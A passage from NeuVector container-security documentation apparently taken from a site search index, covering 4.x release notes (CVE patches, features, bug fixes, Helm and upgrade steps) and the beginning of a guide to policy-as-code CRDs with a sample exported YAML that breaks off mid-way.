Allow user to customize PriorityClass of the manager/controller/enforcer/scanner deployment. We suggest to give NeuVector containers higher priority to make sure the security policies get enforced when the node resource is under pressure or during a cluster upgrade process.  Important Helm Chart Update November 2020​  Important: Changes to Helm Chart Structure  The directory for the NeuVector chart has changed from ./neuvector-helm/ to ./neuvector-helm/charts/core/  If using Helm to upgrade, please update the location to the path above. ","version":"Next 🚧","tagName":"h3"},{"title":"4.x Release Notes","type":0,"sectionRef":"#","url":"/next/releasenotes/4x","content":"","keywords":"","version":"Next 🚧"},{"title":"Release Notes for 4.x​","type":1,"pageTitle":"4.x Release Notes","url":"/next/releasenotes/4x#release-notes-for-4x","content":" 4.4.4-s3 Security Patch April 2022​  Update all images to remediate high CVE-2022-28391 in busybox (alpine).  4.4.4-s2 Security Patch March 2022​  Update to remediate CVE-2022-0778, an OpenSSL vulnerability found in the Alpine base image used by NeuVector images. Short description: It is possible to trigger an infinite loop by crafting a certificate that has invalid elliptic curve parameters. Since certificate parsing happens before verification of the certificate signature, any process that parses an externally supplied certificate may be subject to a denial of service attack. More details can be found at the following links. https://security.alpinelinux.org/vuln/CVE-2022-0778https://www.suse.com/security/cve/CVE-2022-0778.htmlhttps://nvd.nist.gov/vuln/detail/CVE-2022-0778  4.4.4-s1 Security Patch February 2022​  Update alpine in Manager to remove recent CVEs including High ratings CVE-2022-25235, CVE-2022-25236 and CVE-2022-25314Note: Recent CVEs have also been published in the Manager CLI module related to the python package. The python package will be replace in the 5.0 version with python3 to remove any CVEs. This is currently scheduled for GA in May 2022. The CLI is not remotely accessible and can't be accessed through the GUI, so proper Kubernetes RBACs to restrict 'kubectl exec' commands into the Manager pod will protect against exploits.List of manager 4.4.4 CVEs alpine:3.15.0 High CVE-2022-25235 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25235 expatalpine:3.15.0 High CVE-2022-25236 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25236 expatalpine:3.15.0 Medium CVE-2022-25313 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25313 expatalpine:3.15.0 High CVE-2022-25314 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25314 expatalpine:3.15.0 High CVE-2022-25315 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25315 expatalpine:3.15.0 Medium CVE-2020-26137 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26137 usr/lib/python2.7/site-packages/urllib3-1.25.3alpine:3.15.0 High CVE-2020-7212 https://github.com/advisories/GHSA-hmv2-79q8-fv6g usr/lib/python2.7/site-packages/urllib3-1.25.3alpine:3.15.0 High CVE-2021-33503 https://github.com/advisories/GHSA-q2q7-5pp4-w6pg usr/lib/python2.7/site-packages/urllib3-1.25.3alpine:3.15.0 Medium CVE-2021-3572 https://github.com/advisories/GHSA-5xp3-jfq3-5q8x usr/lib/python2.7/site-packages/pip-20.3.4  Other Updates February 2022​  Update Helm chart to 1.9.1. Allow users to specify different image SHA hash instead of tags, add support for k3s in Rancher UI.Community Operator is updated to 1.3.5 to support 4.4.4.Certified Operator is updated to to 1.3.2 to support 4.4.4.  4.4.4 February 2022​  Enhancements​  Add environment variable for Enforcer to turn off secrets scanning, which in some environments can consume resources. Set to ENF_NO_SECRET_SCANS=1In Vulnerability Explorer &gt; CSV download, show affected containers in multiple rows instead of in the same cell.  Bug Fixes​  Reduce secrets scanning by Enforcer to avoid possibility of long running scanning tasks which can consume memory. This may be caused by large image registry or database scan locally.Fix bug when attempting to export CSV for CVE's found in the vulnerability explorer Security Risks -&gt; Vulnerabilities without using filter, the CSV file is empty.Fix timing issue when upgrading from 4.2.2 which can result in implicit deny for all traffic. Most recent fix is related to XFF settings during rolling updates.  Other​  Allow users to specify different image SHA hash instead of tags https://github.com/neuvector/neuvector-helm/pull/140. Will be propagated to Operator.  4.4.3 January 2022​  Enhancements​  Replace the self-signed certificate for Manager which is expiring January 23, 2022 with new one expiring Jan. 2024.Improve ability to display unmanaged workloads in Network Activity map which are not relevant.  Bug Fixes​  Fix Controller crashes when scanning gitlab registry.Admission control not blocking for some images. This is because a vulnerability found in multiple packages is treated as 1 vulnerability in Controller's admission control and is fixed.Upgrade from 4.2.2 to 4.3.2 results in implicit deny for all traffic if high traffic during rolling upgrade.  Other​  Helm chart v1.8.9 is published for 5.0.0 deployments.  4.4.2 December 2021​  Enhancements​  Add support for scanning embedded java jars and jars without Maven file, for example log4j-core-2.5.jar, when pom.xml doesn’t exist.Add CVE database source of GitHub advisories for Maven, starting with scanner/CVE db version 2.531.Rest API reference doc is updated to 4.4.1 and 4.4.2.  Bug Fixes​  Fix memory leak detected in Enforcer.  4.4.1 December 2021​  Enhancements​  Add support for cgroup v2, which is required for some environments such as SUSE Linux Enterprise Server 15 SP3.  Bug Fixes​  Fix the issue where Enforcer is unable to detect CVE-2021-44228 in running containers.Reduce/fix high memory usage by Enforcer for some environments.Fix an issue with import/export of nv.ip group policy.Fix issue with removing a group with no container members.Fix issue of can't login using neuvector-prometheus-exporter intermittently.Fix issue with REST API endpoint /v1/response/rule?scope=local not deleting all response rules.  Helm Chart Update 1.8.7​  Support affinity and toleration customization for controller, scanner and manager.Add nodeSelector support for Controller, Manager, Scanner, updater pods.Support user-defined environment variables for controller container.  Splunk App Published​  New Splunk app for NeuVector is published at https://splunkbase.splunk.com/app/6205/  4.4.0 December 2021​  Enhancements​  Add ability to 'Accept' a vulnerability (CVE) to exclude it from reports, views, risk scoring etc. A vulnerability can be selected and the Accept button clicked from several screens such as Security Risks -&gt; Vulnerabilities, Assets -&gt; Containers etc. Once accepted, it is added to the Security Risks -&gt; Vulnerability Profile list. It can be viewed, exported, and edited here. Note that this Accept feature can be limited to listed Images and/or Namespaces. New entries can also be added manually to this list from this screen.Enable a Configuration Assessment of a kubernetes deployment yaml file. Upload a yaml file from Policy -&gt; Admission Control and it will be reviewed against all Admission Control rules to see if it will hit any rules. A report of the assessment can be downloaded from this window.  Bug Fixes​  Fixed packet capture is not available for pod with istio sidecar proxy.Remove writing by Allinone to /dev/null.json  4.3.2-s1 November 2021​  Security patch release that addresses vulnerabilities in 'curl' related libraries discovered in the 4.3.2 release. The discovered CVE are CVE-2021-22945, CVE-2021-22946 and CVE-2021-22947.  4.3.2 September 2021​  Enhancements​  Support Openshift CIS benchmark 1.0.0 and 1.1.0.Support admission control dry-run option.Improve description of the source of admission control criteria. Improve labels criteria in admission control to add other criteria.Support gitlab cloud (SaaS) registry scan.Support multi-architecture image scan.ConfigMap override option to reset config whenever controller starts. The 'always_reload: true' can be used in any configMap yaml to force reload of that yaml every time the controller starts.Include pre-built PSP best practices admission control rules.Test support for AppArmor profile for running NeuVector as non-privileged containers.Allow users to click Group name in Security events list to go to the Policy -&gt; Groups selection.  Bug Fixes​  Add indicator for admission control criterion to determine if scan result is required.Warning if all NeuVector components are not running the same version.Show Docker Swarm/Mirantis platform in Network Activity -&gt; View -&gt; Show System. This is enabled by adding the environment variable for the Enforcer NV_SYSTEM_GROUPS.  Other​  Update cronjob version in helm chart (v. 1.8.3).Support Jenkins master-slave configuration in Jenkins plug-in.  4.3.1 August 2021​  Enhancements​  Display node labels under Assets -&gt; Nodes.Display statistics for the Controller in Assets -&gt; System ComponentsReport if a vulnerability is in the base image layers in image scan when using the REST API to scan images. The base image must be identified in the api call, as in the example below.  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;https://registry.hub.docker.com/&quot;, &quot;repository&quot;: &quot;garricktam/debian&quot;, &quot;tag&quot;: &quot;latest&quot;, &quot;scan_layers&quot;: false, &quot;base_image&quot;: &quot;2244...../nodejs:3.2......&quot;}}' &quot;https://$RESTURL/v1/scan/repository&quot; {noformat}   Limitations: If the image to be scanned is a remote image, with &quot;registry&quot; specified, the base image must also be a remote image, and the name must start with http or https.If the image to be scanned is a local image, then the base image must also be a local image as well. For example,  {&quot;request&quot;: {&quot;repository&quot;: &quot;neuvector/manager&quot;, &quot;tag&quot;: &quot;4.0.2&quot;, &quot;scan_layers&quot;: true, &quot;base_image&quot;: &quot;alpine:3.12.0&quot;}} {&quot;request&quot;: {&quot;registry&quot;: &quot;https://10.1.127.12:5000/&quot;, &quot;repository&quot;: &quot;neuvector/manager&quot;, &quot;tag&quot;: &quot;4.0.0&quot;, &quot;scan_layers&quot;: true, &quot;base_image&quot;: &quot;https://registry.hub.docker.com/alpine:3.12.0&quot;}} {&quot;request&quot;: {&quot;repository&quot;: &quot;neuvector/manager&quot;, &quot;tag&quot;: &quot;4.0.2&quot;, &quot;scan_layers&quot;: true, &quot;base_image&quot;: &quot;10.1.127.12:5000/neuvector/manager:4.0.2”}}   Bug Fixes​  Make enforcer list height adjustable.Sanitize all displayed fields to prevent XSS attacks.  4.3 July 2021​  Enhancements​  New Network Activity display in console improved performance and object icon design. New UI framework dramatically improves loading times for thousands of objects to be displayed. Session filters are maintained until logout in Network Activity, Security Risks and other menu's. GPU acceleration is enabled, which can be disabled if this causes display issues. Note: Known issue with certain Window's PCs with GPU enabled.Add ability to import Group Policy (CRD file yaml format) from console to support non-Kubernetes environments. Important: Imported CRDs from console do NOT get classified and displayed as CRD rules. They can be edited through the console, unlike CRD's applied through Kubernetes.Support multiple web hook endpoints. In Settings -&gt; Configuration, multiple web hook endpoints can be added. In Response Rules, creating a rule enables user to select which end point(s) to notify by web hook.Support (multiple web hook) configuration in Federated rules.Support JSON format for web hooks. Can now configure JSON, key-value pairs, or Slack as web hook formats when creating a web hook.Support custom user roles for map to a namespace user. Directory integration support mapping of groups to roles, with role being able to limit to namespace(s). Limitation: If the user is in multiple groups, the role will be 'first matched' group's role assigned. Please the order of configuration for proper behavior.Download list of external IPs for egress connections. Added ability to download report/CSV from the Dashboard page under section Ingress and Egress Exposure.Support cve-medium criteria in Response Rules.Add preconfigured PSP Best Practice rule to Admission Control rules. For example the following preset criteria can alert/block a deployment: Run as Privileged, Run as Root, Share host's IPC Namespaces = true, Share host's Network = true, Share host's PIC Namespaces = true.Support using Namespace in Advanced Filter for Security Risks Vulnerabilities &amp; Compliance for Assets report in PDF.Support Admission Control rule criteria based on CVE score.Add a Test Registry button when configuring registry scanning for registries that support this feature such as docker and JFrog.Improve support log download and controller debug settings. Enable download settings such as cPath and which component logs are downloaded.Add support for Kubernetes 1.21.  Bug Fixes​  Support Kubernetes 1.21 with containerd 1.4.4. The containerd run-time v1.4.4 changes its cgroup representations.Scanner identifies OS as ol:7.9 with false positive CVEs.Support standalone scanner deployment on Azure DevOps extension.  Other Changes​  Helm Chart v1.8.0 is updated to default to registry.neuvector.com as the default registry. NOTE: Must specify the version tag manually.Add configurable parameters such as Controller API annotations in Helm chart. Available from version 1.7.6+.Community Operator 1.2.6, Certified Operator 1.2.7 updated to reflect Helm chart updates including adding OpenShift route when controller.apisvc.type is enabled. The certified Operator 1.2.7 deploys NeuVector version 4.2.2.Add HTML output format for scan results in Jenkins pipeline scanning results.Add namespace of impacted workload in Prometheus exporter alerts. Now supported in neuvector/prometheus-exporter:4.2.2 and later.  4.2.2 April 2021​  Enhancements​  Enable enforcement of a password policy. If this feature is enabled, passwords must meet minimum security requirements configured. Go to Settings - User/Roles to set the password policy, including minimum characters, upper case, numeric, and special characters required. Guessing and password reuse are also prevented.Allow slash in key/value in CRD group definition.Enhance SAML to support CAC authentication. SAML AFDS Common Access Card (CAC) authentication method.Verify compatibility with OpenShift 4.7  Bug Fixes​  Fix the condition where Enforcer is delaying node reboot for up to 20 minutes on OpenShift update.Correct Unmanaged node terminology to be 'nodes'.CRD import produced unexpected results. A conversion tool is available from NeuVector to help convert from previous releases CRD format.In AKS webhook certificates created without SAN for k8s v1.19+.Federated policy working inconsistently and not as expected. Improve unmanaged workload ip logic to reduce unnecessary violations.  4.2.1 March 2021​  Bug Fixes​  Predefined File Access rules are not displaying in console.Column headers are incorrect in several console views such as Assets-&gt;Registry-&gt;Module Scan Results. Some PDF reports were also affected and have been fixed. Other areas primarily in Sonatype build have been fixed.  4.2 March 2021​  Enhancements​  Multi-cluster Monitoring. Centralized visibility of the security posture of all managed clusters, by displaying the risk score and cluster summary for each cluster on multi-cluster management page. Note: multi-cluster federation requires a separate license.Add support for IBM Cloud integrated usage-based billing.Enhance PCI compliance report to show asset view , listing vulnerabilities by service.Add summary of scan result before listing the vulnerability.Support Red Hat OVAL2 database required for Red Hat Vulnerability Scanner certification.Support Red Hat OpenShift beta version of CIS benchmarks ('inspired by CIS'). This will be finalized when the CIS.org publishes the official version. This feature is supported for deployments of OpenShift version 4.3+.Allow API query filtering to check for conditions such as images allowed or denied using API calls.Add support for CIS Kubernetes benchmark 1.6.0.Report and display Image Modules detected during scan in scan results. This is shown in a tab in Image Scan results, and included in scan results from REST API.Allow editing of filters in registry, group, and response rule configurations through console.Update ConfigMap to add group_claim in oidcinitcfg.yaml and samlinitcfg.yaml, and Xff_Enabled in sysinitcfg.yamlAPI's yaml is updated for 4.2 in Automation section.  Bug Fixes​  Enforcer is unable to join existing cluster, sometimes taking 10 minutes in cases where there are too many enforcers registered. This is when enforcers are terminated ungracefully but still registered for license checks, preventing other enforcers from joining when the license limit is reached.Fixed: wildcard DNS traffic blocked. Improved the caching of dns results matching to wildcard dns address group.Fix rare condition where CRD certificates gets out of sync for webhook and controller.Correct legend in Network Activity display for 'Unmanaged' to 'Nodes'.Nodes detected as workload resulting in implicit violations.  Other​  Jenkins Plugin enhancements: Overwrite vulnerability severity by score.Add error messages to the JAVA exceptions hudson.AbortException. Update Helm chart to 1.7.1.  Please see release notes section Integrations &amp; Other Components for details.  4.1.2 February 2021​  Enhancements​  Enable toggling for XFF-forwarding to disable the NeuVector policy from using it, which is enabled by default. This is related to a function added in 4.1.1 to add support for x-forwarded-* headers. To disable, go to Settings -&gt; Configuration. IMPORTANT: See the detailed description of the behavior of XFF-FORWARDED-FOR below.  Bug Fixes​  Fixed that CVE-2020-1938 is not detected.Fix error from Manager &quot;Failed to export configurations of section {policy, user, config}.&quot;Fix Network Activity Graph filter is not working.Improve controller CPU and memory consumption.  Other​  Jenkins plug-in updated to support stand alone scanner. Please see release notes section Integrations &amp; Other Components for details.  XFF-FORWARDED-FOR Behavior Details​  In a Kubernetes cluster, an application can be exposed to the outside of the cluster by a NodePort, LoadBalancer or Ingress services. These services typically replace the source IP while doing the Source NAT (SNAT) on the packets. As the original source IP is masqueraded, this prevents NeuVector from recognizing the connection is actually from the 'external'.  In order to preserve the original source IP address, the user needs to add the following line to the exposed services, in the 'spec' section of the external facing load balancer or ingress controller. (Ref: https://kubernetes.io/docs/tutorials/services/source-ip/)  &quot;externalTrafficPolicy&quot;:&quot;Local&quot;  Many implementations of LoadBalancer services and Ingress controllers will add the X-FORWARDED-FOR line to the HTTP request header to communicate the real source IP to the backend applications. In 4.1.0 release, we added a feature to recognize this set of HTTP headers, identify the original source IP and enforce the policy according to that.  This improvement created some unexpected issues in some setup. If the above line has been added to the exposed services and NeuVector network policies have been created in a way that expect the network connections are coming from internal proxy/ingress services, because we now identify the connections are from &quot;external&quot; to the cluster, normal application traffic might trigger alerts or get blocked if the applications are put in &quot;Protect&quot; mode.  In 4.1.2, switch is added to disable this feature. Disabling it tells NeuVector not to identify that the connection is from &quot;external&quot; using X-FORWARDED-FOR headers. By default this is enabled, and the X-FORWARDED-FOR header is used in policy enforcement. To disable it, go to Settings -&gt; Configuration, and disable the &quot;X-Forwarded-For based policy match&quot; setting.    4.1.1 January 2021​  Bug Fixes​  Add support for AWS EKS AMI Release v20210112 to fix ulimit issues.  4.1 December 2020​  Enhancements​  Allow users to change policy mode when exporting CRD.OIDC support claims from /oauth/userinfo endpoint.Cluster node refresh support to allow temporary support for node growth and migration of pods between nodes.Generate a usage report for download from the Settings -&gt; Configuration page.Wildcard support on namespace when assigning user roles to namespace.Improve group/policy removal logic. Configurable setting for when an unused group is removed based on the amount of time since it was last used.Allow user to configure packet capture duration.Add support for Multi-cluster management reader role.Stand alone scanner now submits scan result using REST API. See below for Scanner Details.Detect and block Man-in-the-middle attack reported in CVE-2020-8554.Add support for metered (usage based) licensing models.Remove step for creation of CRDs (e.g. NvSecurityRule) from the sample deployment yamls for Kubernetes and Openshift. This is not required (Controller will create these automatically). Helm deployment will also take care of these.  Bug Fixes​  Improve high memory usage on controller and enforcer.Error returned when trying to configure a registry filter. Allow wildcard be used any place in the repo/tag filter.Block policy not working as expected. Add support for x-forwarded-* headers. IMPORTANT: See the detailed description of the behavior of XFF-FORWARDED-FOR above as part of the 4.1.2 release notes.Helm Chart error when setting controller ingress to true.Unable to create add and save network rule, due to gateway timeout.Configmap examples are missing Group_Claim field. Added to configmap documentation.Process profile violation when terminating Controller pod.  Scanner Details​  Two additional environment variables are added in order to login to controller REST API. Users with CICD integration role can submit the results.  New Environment Variables: SCANNER_CTRL_API_USERNAME, SCANNER_CTRL_API_PASSWORD  Usage Example  docker run --name neuvector.scanner --rm -e SCANNER_REPOSITORY=ubuntu -e SCANNER_TAG=16.04 -e SCANNER_LICENSE=$license -e CLUSTER_JOIN_ADDR=10.1.2.3 CLUSTER_JOIN_PORT=32368 -e SCANNER_CTRL_API_USERNAME=username -e SCANNER_CTRL_API_PASSWORD=secret -v /var/run/docker.sock:/var/run/docker.sock -v /var/neuvector:/var/neuvector neuvector/scanner   Kubernetes 1.19+ and CRD Exports​  important To use an exported CRD with Kubernetes 1.19+, please remove the 'version: v1' from each section. This can be found at the end or near the end of each section in an exported Group policy CRD.   version: v1   4.0.3 December 2020​  Bug Fixes​  Process profile violation occurring when terminating Controller pod.Implicit violations for user created address group which uses wildcard in hostnames.  Helm Chart Changes​  Allow user to customize PriorityClass of the manager/controller/enforcer/scanner deployment. We suggest to give NeuVector containers higher priority to make sure the security policies get enforced when the node resource is under pressure or during a cluster upgrade process.Create a separate chart for CRD. This allows CRD policies to be created before NeuVector core services are deployed. If the new chart is used, the CRD resources in the core chart, kept for backward compatibility, should be disabled with crdwebhook.enabled=falseAllow user to specify the service account for NeuVector deployment. Previously, the 'default' service account of the namespace is used. In the case when NeuVector is deployed together with other applications in a namespace, it is not advisable to use the default service account for the namespace for some users.  4.0.2 December 2020​  Enhancements​  Console - the container list page Assets -&gt; Containers should allow the window separators to be dragged to be resized.Add admission control checks for pod share host namespaces. Allow user to choose to prevent pod from sharing host's Network, IPC, PID namespaces. See below for more details.Ability to export list of containers running in privileged or 'runasroot'.In Notifications -&gt; Security Events, enable the display of information about the event attributes easily without switching screens.  Bug Fixes​  Issue with jumbo frames (enabled on some public clouds). Symptom: the main prometheus application URI /graph becomes inaccessible when the prometheus group is placed into Protect mode.Missing namespace option in vulnerabilities filter. Allow users to select/type the Namespace where NeuVector is installed as filter entry.False positive in OpenSSL version 1.1.1c-1 affected by CVE-2020-1967.Unexpected implicit deny violations for user created address group using wildcard hostnames. Problems with using DNS Name (with wildcards) for Firewall Traffic.Improve detection to remove SQL Injection false positive.  Admission Control for Pod Sharing​  HostPID - Controls whether the pod containers can share the host process ID namespace. Note that when paired with ptrace this can be used to escalate privileges outside of the container (ptrace is forbidden by default).HostIPC - Controls whether the pod containers can share the host IPC namespace.HostNetwork - Controls whether the pod may use the node network namespace. Doing so gives the pod access to the loopback device, services listening on localhost, and could be used to snoop on network activity of other pods on the same node.  4.0.1 November 2020​  important Changes to Helm Chart Structure The directory for the NeuVector chart has changed from ./neuvector-helm/ to ./neuvector-helm/charts/core/ If using Helm to upgrade, please update the location to the path above.  Enhancements​  Add support for distroless image scanning.Add ability to trigger single image scan from registry with results available for admission control.Update JFrog Xray integration to new JFrog platform api / authentication requirements.Add information about scanners in the Manager such as version and scanner statistics.Add quick filter to exclude security events (similar to grep -v).Update CVE Severity to align with NVD vulnerability severity ratings. Using the larger of the CVSS v2 and v3 scores, the ratings are High for &gt;=7, Medium for &gt;=4.Support standalone scanner deployments for local image scanning (does not require controller). Adds new environment variables SCANNER_LICENSE, SCANNER_REGISTRY, SCANNER_REPOSITORY, SCANNER_TAG, SCANNER_REGISTRY_USERNAME, SCANNER_REGISTRY_PASSWORD, SCANNER_SCAN_LAYERS, CLUSTER_JOIN_ADDR, CLUSTER_JOIN_PORT.Support namespace auto-complete for namespace user creation in Settings -&gt; Users.Add ability to enter exempted CVEs in the Jenkins scanner plug-in.Add admission control criteria to be able to block images for which the scan failed to detect the OS (e.g. archlinux images) and therefore no vulnerabilities were found. A new criteria &quot;Image Without OS information&quot; is added, when set to true, means the base OS of the image is unavailable.  Bug Fixes​  Improve (decrease) Controller memory usage.Enable support for webhook functions such as admission control and CRD in Kubernetes 1.19.Add support for apiextensions.k8s.io/v1 deployments as required for Kubernetes 1.19 (and supported in k8s 1.18).Unexpected process profile rule violation resulting from parent shell script for process on the allowed list.Add support for wildcard filters in Harbor registry (configured using Docker registry setting).Improve handling of configmap to re-load if admin password is reverted to the default. This is to prevent insecure access when the system is recovered from cluster level storage failure.  4.0.0.s1 October 2020​  Security Patch for NeuVector Containers​  This security release is for the NeuVector Manager and Allinone containers to address High CVE-2020-14363 found in the base Alpine layer in package libx11. As part of the update, Medium CVE-2020-8927 is also addressed. This issue, although unlikely to be able to be exploited, affects the Manager console for NeuVector and does not affect the operations of the Controller or Enforcer containers.  4.0 September 2020​  Enhancements​  Customizable compliance templates. Preset templates for PCI, GDPR, HIPAA, NIST. Each CIS benchmarks and custom check can be tagged with one or more compliance regulations. Reports can then be generated for each. Security Risks -&gt; Compliance Profile.Vulnerability Management Workflow Support. Track status of vulnerabilities and create policies based on vulnerability discovery dates and other criteria. Security Risks -&gt; Vulnerabilities (Advanced Filter), and Admission Control rules.Secrets auditing. 20+ secrets checks included, and automatically run on image scans and resource yamls. Results will show pass/warn in the compliance reports on image vulnerabilities in Assets -&gt; Registries and Security Risks -&gt; Compliance.Granular RBAC for NeuVector Users. Create custom roles with granular read/write permissions for NeuVector functions. Assign users to roles. Settings -&gt; Users/Roles.Scalable and Separated Scanner Pods. Scanner pods can be scaled up or down to scan thousands of images. The controller assigns scanning tasks to each available scanner pod. Important: the Controller no longer contains a scanner function, so a minimum of one scanner pod is required to be deployed. Also, the 4.x scanners are NOT backward compatible with 3.x controllers, 3.x deployments of external scanners should be updated to neuvector/scanner:3.Serverless Scanning and Risk Assessment for AWS Lambda. Scan AWS Lambda functions for vulnerabilities with the Serverless IDE Plug-in or in AWS accounts. Supported languages include Java, Python, Ruby, node.js. Perform risk assessment by evaluating IAM role permissions for Lambda functions and alert if unnecessary permissions are enabled. Note: Serverless security requires a separate NeuVector license.Perform compliance checks during image scanning. Also deployment yamls file. This includes setuid, setgid, CIS (running as root etc), 20+ secrets checks.Enhance Security Risk Score in Dashboard with ability to enable/disable which Groups contribute to the Risk Score. Policy -&gt; Groups -&gt; Scorable check box. This includes ability to disable system containers from risk scoring.Added support for a Namespace restricted user to have access to assigned registries.Break out scanning syslog notifications to individual CVE syslog events.Allow a namespace restricted user to be able to create registries that are only visible by users that have access to that namespace (including global users).Download pdf reports from the dashboard by namespace. Select a namespace to filter the dashboard pdf report.The CRD import behavior has been changed to ignore the PolicyMode of any 'linked' group, leaving the Policy mode unchanged if the linked group already exists. If the linked group does not exist it will be automatically created and set to the default New Services Mode in Settings -&gt; Configuration. A 'linked' group is one which has not been selected for export but is referred to by a network rule, and thus has been exported along with the selected group(s).  Bug Fixes​  Registry URL validation allows URL without protocol scheme prefix. Added protocol schema validation.Container scans failed - Fail to read files in some situations. Fixes error &quot;Failed to read file - error=&lt;nil&gt;&quot;.The Group member column is inaccurate for the special group &quot;nodes.&quot;Discount (reduce) Admission Controls (4 points) from Overall Risk Scoring for Docker EE Platform since it is not applicable.A scanner only controller can take 15-20 minutes to become ready.Security risks &gt; Vulnerabilities &quot;Severity&quot; Distribution title is mislabeled as Urgency.Security Events source Workload:ingress rule does not match. Unexpected implicit violation from Workload:Ingress on OpenShift 3.11 platform. Internal subnet logic is improved to handle large IP range.Enforcer reports error trying to connect to /var/run/docker.sock. Add recovery if connection is lost.  Summary of Major Operational Changes​  The 4.x Scanner is NOT compatible with the 3.2.0, 3.2.1, 3.2.2 Controllers. If you have deployed 3.x external scanners and wish to have them continue to run, be sure to UPDATE the scanner deployment with a version 3 tag, e.g. neuvector/scanner:3. Alternatively, you can update to 3.2.3+.License to enable serverless security requiredNew clusterolebinding and clusterrole added for Kubernetes an OpenShiftController no longer has built in scanner. You must deploy at least 1 scanner pod.Yaml file changes in main deployment samples: Added deployment for scanner pods (2 default)Scanner pod deployment has commented out section for local scanning casesAdded cron job for updater pod for cve database updates of scanners  Upgrading from 3.x to 4.0​  For Helm deployments, update the helm chart to the new version 1.6.0. Then a standard upgrade to 4.0.0 is all that is required (e.g. helm upgrade my-release --set imagePullSecrets=regsecret-neuvector,tag=4.0.0 ./neuvector-helm/).  tip Kubernetes (for OpenShift use the equivalent oc commands)  Backup the configuration from Settings -&gt; ConfigurationCreate the two new bindings kubectl create clusterrolebinding neuvector-binding-view --clusterrole=view --serviceaccount=neuvector:defaultkubectl create rolebinding neuvector-admin --clusterrole=admin --serviceaccount=neuvector:default -n neuvector Set the version tags to 4.0.0 for the Controller, Manager, Enforcer yaml's and apply the updateCreate the scanner podsCreate or update the scanner cron jobWait a few minutes for the rolling update of the controllers to complete, and check all settings after login... ","version":"Next 🚧","tagName":"h3"},{"title":"Reporting","type":0,"sectionRef":"#","url":"/next/reporting","content":"Reporting Reporting and Notifications","keywords":"","version":"Next 🚧"},{"title":"Vulnerability Scanning, Compliance Testing, and Admission Controls","type":0,"sectionRef":"#","url":"/next/scanning","content":"Vulnerability Scanning, Compliance Testing, and Admission Controls Full Lifecycle Image and Container Scanning, CIS Benchmarks for Security, and Compliance","keywords":"","version":"Next 🚧"},{"title":"CRD - Custom Resource Definitions","type":0,"sectionRef":"#","url":"/next/policy/usingcrd","content":"","keywords":"","version":"Next 🚧"},{"title":"NeuVector CRD for Policy As Code​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/next/policy/usingcrd#neuvector-crd-for-policy-as-code","content":" NeuVector custom resource definitions (CRDs) can be used by various teams to automatically define security policies in the NeuVector container security platform. Developers, DevOps, DevSecOps, and Security teams can collaborate to automate security policies for new or updated applications deployed to production. CRDs can also be used to enforce global security policies across multiple Kubernetes clusters.  note CRDs are supported in Kubernetes 1.11 and later. Deploying the NeuVector security rule CRD in earlier versions may not result in an error, but the CRD will not be processed.  CRD's can be used to support many use cases and workflows:  Define security policy during application development, to push into production.Learn behavior using NeuVector and export the CRD for review before pushing into production.Migrate security policies from staging to production clusters.Replicate rules across multiple replicated clusters in hybrid or multi-clouds.Enforce global security policies (see examples for this at bottom).  CRD's bring many benefits, including:  Define / declare the security policy, as code.Version and track the security policies the same as application deployment manifests.Define the allowed behavior of any application including network, file and process behavior.  Supported Resource Types​  NeuVector supports two kinds of custom resource definitions. They are the NvSecurityRule and NvClusterSecurityRule. The difference among the two comes down to the boundary set by the definition of the scope. The NvSecurityRule resource is scoped at the namespace level, whereas the NvClusterSecurityRule is scoped at the cluster level. Either of the resource types can be configured in a yaml file and can be created during deployment, as shown in the deployment instructions and examples for NeuVector.  The significance of the NvSecurityRule resource type with a scope of namespace lies in the enforcement of the configured domain of the target group, which must match the configured namespace in the NeuVector’s CRD security policy. This provides enforcement to prevent unwanted cross-namespace policy creation which affect a Target-Group policy rule.  For the NvClusterSecurityRule custom resource definition, this has a cluster level scope, and therefore, does not enforce any namespace boundary on a defined target. However, the user-context that is used for importing the CRD-yaml file must have the necessary permissions to access or reside in the same namespace as the one configured in the CRD-yaml file, or the import will be rejected.  Enabling CRD SupportAs described in the Kubernetes and OpenShift deployment sections (Deploying NeuVector), the appropriate clusterroles and clusterrole bindings for custom resources and NvSecurityRules should be added first.  Then NvSecurityRule and NvClusterSecurityRule should be created using the sample yaml in those sections. NeuVector CRDs can now be deployed.  ","version":"Next 🚧","tagName":"h3"},{"title":"Generating a Sample NeuVector CRD​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/next/policy/usingcrd#generating-a-sample-neuvector-crd","content":" The simplest way to see how the yaml file format looks for a NeuVector CRD is to export it from the NeuVector Console. After you have tested your application while NeuVector is in Discover mode learning the network, file, and process behavior, you can export the learned policy.  Go to the Policy -&gt; Groups menu and click on Export Group Policy from the upper right.    Then select the Groups that you wish to export, such as the three in the demo namespace above. Inspect the saved CRD yaml below to see how the NeuVector network, process, and file rules are expressed.  note In addition to the selected group(s), all 'linked' groups will also be exported. A linked group is any other group that a selected group will connect to or from as allowed by a network rule.  Sample Exported CRD  apiVersion: v1 items: - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.nginx-pod.demo namespace: demo spec: egress: - selector: criteria: - key: service op: = value: node-pod.demo - key: domain op: = value: demo name: nv.node-pod.demo action: allow applications: - HTTP name: nv.node-pod.demo-egress-0 ports: any file: [] ingress: - selector: criteria: - key: service op: = value: exploit.demo - key: domain op: = value: demo name: nv.exploit.demo action: allow applications: - HTTP name: nv.nginx-pod.demo-ingress-0 ports: any process: - action: allow name: nginx path: /usr/sbin/nginx - action: allow name: pause path: /pause - action: allow name: ps path: /bin/ps target: selector: criteria: - key: service op: = value: nginx-pod.demo - key: domain op: = value: demo name: nv.nginx-pod.demo policymode: Monitor - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.node-pod.demo namespace: demo spec: egress: - selector: criteria: - key: address op: = value: google.com name: test action: allow applications: - SSL name: test-egress-1 ports: any - selector: criteria: - key: service op: = value: redis-pod.demo - key: domain op: = value: demo name: nv.redis-pod.demo action: allow applications: - Redis name: nv.redis-pod.demo-egress-2 ports: any - selector: criteria: - key: service op: = value: 